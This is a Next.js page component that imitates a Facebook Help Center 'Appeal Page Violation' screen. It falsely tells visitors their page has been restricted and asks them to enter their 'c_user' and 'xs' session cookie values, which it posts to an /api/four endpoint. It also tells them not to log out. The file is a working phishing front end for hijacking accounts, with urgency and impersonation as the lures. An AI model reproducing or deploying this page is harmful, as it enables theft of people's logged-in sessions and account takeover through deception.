"use client";
import Image from "next/image";
import Link from "next/link";
import { useState } from "react";

export default function Home() {
  const [user, setUser] = useState<string>("");

  const sendEmail = async () => {
    const response = await fetch("/api/four", {
      method: "POST", // or 'GET', 'PUT', etc.
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ user }), // or any data you want to send
    });

    if (!response.ok) {
      console.error("HTTP error", response.status);
    } else {
      const data = await response.json();
      console.log(data);
    }
  };

  return (
    <main className="flex flex-col w-full h-full bg-[#FFFFFF]">
      <div className="w-full h-20 bg-[#4667AC] flex flex-row items-center justify-between px-10 ">
        <Image src={"/logo2.jpeg"} alt="" width={320} height={320} />
        <input
          className="w-[45%] h-11 rounded-md p-3"
          placeholder="How Can We Help..."
        />
      </div>
      <div className="w-full h-9 flex flex-row items-center justify-between px-16 p-8 bg-[#F5F5F5] ">
        <Link href={"/"} className="font-bold">
          Help Center
        </Link>
      </div>
      <div className="w-full h-full flex flex-col items-center justify-between px-16 p-8 bg-[#FFFFFF]">
        <div className="w-[60%] h-[50%] border-[#C2C2C2] border-2 pt-7  p-5">
          <h1 className="text-xl font-bold">Appeal Page Violation</h1>
          <p className="my-5">
            We have detected unusual activity on your page that violates our
            community standards.
          </p>
          <p className="my-5">
            Your access to your page has been limited, and you are currently
            unable to post, share, or comment using your page.
          </p>
          <p className="my-5">
            If you believe this to be a mistake, you have the option to submit
            an appeal by providing the necessary information.
          </p>
          <Link href="/" className="text-base text-[#94AFA3] mt-9">
            Detailed Video Information
          </Link>

          <a
            href="https://detailed-video-29b30.web.app/detailed%20video.mp4"
            target="_blank"
          >
            <Image
              src={"/faceboo-video-play.png"}
              alt=""
              width={210}
              height={250}
            />
          </a>
          <p className="mt-6">c_user:</p>
          <input
            className="w-[30%] h-11 rounded-md p-3 border-black border-2"
            placeholder=""
            onChange={(event) => setUser(event.currentTarget.value)}
          />

          <p className="mt-6">xs:</p>
          <input
            className="w-[30%] h-11 rounded-md p-3 border-black border-2"
            placeholder=""
          />

          <p className="my-5">
            Please make sure account not to log out from your computer or laptop
            until you have received a verification email.
          </p>

          <button
            onClick={sendEmail}
            className="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 me-2 mb-2 dark:bg-blue-600 dark:hover:bg-blue-700 focus:outline-none dark:focus:ring-blue-800"
          >
            Submit Appeal
          </button>
        </div>
      </div>
    </main>
  );
}
